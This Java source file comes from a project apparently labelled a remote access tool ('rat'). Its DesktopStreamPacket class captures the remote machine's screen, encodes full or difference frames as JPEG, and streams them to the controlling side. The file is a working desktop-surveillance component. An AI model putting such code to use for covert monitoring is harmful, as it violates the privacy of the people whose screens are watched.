package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;

import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.util.FrameEncoder;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class DesktopStreamPacket extends AbstractPingPongPacket {
	
	private IFrame frame;
	private int screenWidth, screenHeight;
	
	private byte deleteLastScreenshot;
	
	private static BufferedImage lastScreenshot;
	
	private static final byte KEEP = 0;
	private static final byte DELETE = 1;
	
	public DesktopStreamPacket(final boolean delete) {
		type = REQUEST;
		deleteLastScreenshot = delete ? DELETE : KEEP;
	}
	
	public DesktopStreamPacket() {
		this(false);
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		client.writeByte(deleteLastScreenshot);
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		final byte[] data = ImageUtils.toByteArray(frame.image, "JPG");
		
		client.writeInt(frame.x);
		client.writeInt(frame.y);
		client.writeInt(data.length);
		client.write(data);
		client.writeInt(screenWidth);
		client.writeInt(screenHeight);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		deleteLastScreenshot = client.readByte();
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		final int x = client.readInt();
		final int y = client.readInt();
		final int length = client.readInt();
		final byte[] data = new byte[length];
		
		client.read(data);
		
		final BufferedImage image = ImageUtils.toImage(data);
		
		frame = new IFrame(x, y, image);
		screenWidth = client.readInt();
		screenHeight = client.readInt();
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		final BufferedImage screenshot = ScreenshotPacket.takeScreenshot();
		
		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
			frame = new IFrame(0, 0, screenshot);
		} else if (deleteLastScreenshot == KEEP) {
			frame = FrameEncoder.getIFrame(lastScreenshot, screenshot);
			
			if (frame == null) {
				frame = IFrame.EMPTY;
			}
		} else {
			frame = IFrame.EMPTY;
		}
		
		type = DATA;
		screenWidth = screenshot.getWidth();
		screenHeight = screenshot.getHeight();
		lastScreenshot = screenshot;
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		//...
	}
	
	public IFrame getFrame() {
		return frame;
	}
	
	public int getScreenWidth() {
		return screenWidth;
	}
	
	public int getScreenHeight() {
		return screenHeight;
	}
	
}
